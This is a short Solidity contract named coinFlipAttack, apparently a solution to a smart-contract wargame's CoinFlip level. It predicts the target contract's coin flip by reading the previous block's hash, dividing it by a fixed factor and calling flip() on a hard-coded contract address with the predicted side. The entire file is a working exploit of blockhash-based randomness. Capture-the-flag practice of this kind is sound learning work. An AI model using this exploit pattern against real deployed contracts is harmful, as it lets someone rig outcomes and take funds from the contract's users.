pragma solidity ^0.6.0;

import 'https://github.com/OpenZeppelin/openzeppelin-contracts/blob/release-v3.2.0/contracts/math/SafeMath.sol';
import './lvl3.sol';

contract coinFlipAttack {
    using SafeMath for uint256;
    uint lastHash;

    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
    CoinFlip public cf = CoinFlip(0xA34812bC176DEd5c830512BDbE3B61125f0ce16d); 

    function flipAttack() public returns (bool){
        uint256 blockValue = uint256(blockhash(block.number.sub(1)));

        lastHash = blockValue;
        uint256 coinFlip = blockValue.div(FACTOR);
        bool side = coinFlip == 1 ? true : false;

        bool status = cf.flip(side);
        return status;
    }
}